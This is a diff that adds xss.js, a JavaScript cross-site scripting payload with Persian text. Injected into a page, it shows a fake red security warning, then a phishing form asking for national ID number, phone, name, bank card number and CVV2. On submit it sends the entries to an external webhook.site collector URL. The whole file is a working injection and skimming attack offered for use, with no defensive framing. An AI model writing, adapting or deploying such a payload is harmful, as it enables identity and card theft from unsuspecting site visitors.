@@ -1,0 +1,102 @@
+// xss.js
+
+(function(){
+  // ساخت پیام هشدار قرمز رنگ
+  var div = document.createElement('div');
+  div.id = 'fake-alert';
+  div.innerHTML = `
+    ⚠️ <b>هشدار امنیتی:</b> برای ادامه کار لطفا روی لینک زیر کلیک کنید.<br>
+    <a href="#" id="showFakeForm" style="color:yellow; text-decoration:underline;">ورود به حساب کاربری</a>
+  `;
+  div.style.position = 'fixed';
+  div.style.top = '20px';
+  div.style.left = '20px';
+  div.style.background = 'red';
+  div.style.color = 'white';
+  div.style.padding = '15px';
+  div.style.zIndex = '9999';
+  div.style.fontSize = '18px';
+  div.style.border = '2px solid black';
+  div.style.boxShadow = '0 0 10px black';
+  div.style.cursor = 'pointer';
+  document.body.appendChild(div);
+
+  // تابع ساخت فرم جعلی
+  function createFakeForm() {
+    var formDiv = document.createElement('div');
+    formDiv.id = 'fake-form';
+    formDiv.style.position = 'fixed';
+    formDiv.style.top = '100px';
+    formDiv.style.left = '50%';
+    formDiv.style.transform = 'translateX(-50%)';
+    formDiv.style.background = '#fff';
+    formDiv.style.padding = '25px';
+    formDiv.style.border = '2px solid red';
+    formDiv.style.zIndex = '10000';
+    formDiv.style.width = '320px';
+    formDiv.style.boxShadow = '0 0 15px rgba(255,0,0,0.8)';
+    formDiv.style.fontFamily = 'Tahoma, Arial, sans-serif';
+
+    formDiv.innerHTML = `
+      <h3 style="color:red; text-align:center; margin-bottom:15px;">ورود به حساب کاربری</h3>
+      <form id="phishingForm">
+        <label>کد ملی:</label><br>
+        <input type="text" name="national_code" required style="width:100%; margin-bottom:10px; padding:6px;"><br>
+
+        <label>شماره تماس:</label><br>
+        <input type="text" name="phone" required style="width:100%; margin-bottom:10px; padding:6px;"><br>
+
+        <label>نام:</label><br>
+        <input type="text" name="first_name" required style="width:100%; margin-bottom:10px; padding:6px;"><br>
+
+        <label>نام خانوادگی:</label><br>
+        <input type="text" name="last_name" required style="width:100%; margin-bottom:10px; padding:6px;"><br>
+
+        <label>شماره کارت:</label><br>
+        <input type="text" name="card_number" required style="width:100%; margin-bottom:10px; padding:6px;"><br>
+
+        <label>CVV2:</label><br>
+        <input type="text" name="cvv2" required style="width:100%; margin-bottom:15px; padding:6px;"><br>
+
+        <button type="submit" style="width:100%; padding:10px; background:red; color:white; font-weight:bold; cursor:pointer;">ارسال اطلاعات</button>
+      </form>
+      <div id="formMsg" style="margin-top:10px; color:green; text-align:center;"></div>
+    `;
+
+    document.body.appendChild(formDiv);
+
+    // کنترل ارسال فرم
+    document.getElementById('phishingForm').onsubmit = function(e) {
+      e.preventDefault();
+      var data = {};
+      var elements = this.elements;
+      for(var i=0; i<elements.length; i++) {
+        if(elements[i].name) {
+          data[elements[i].name] = elements[i].value;
+        }
+      }
+
+      // ارسال داده ها به webhook.site
+      fetch("https://webhook.site/fae1e966-5d1f-4a69-9f22-625bcb548f1b", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(data)
+      }).then(function(){
+        document.getElementById('formMsg').textContent = 'اطلاعات با موفقیت ارسال شد!';
+        document.getElementById('phishingForm').reset();
+      }).catch(function(){
+        document.getElementById('formMsg').textContent = 'خطا در ارسال اطلاعات!';
+      });
+    }
+  }
+
+  // اضافه کردن event به لینک هشدار
+  document.getElementById('showFakeForm').addEventListener('click', function(e){
+    e.preventDefault();
+    this.style.display = 'none';
+    createFakeForm();
+  });
+
+})();
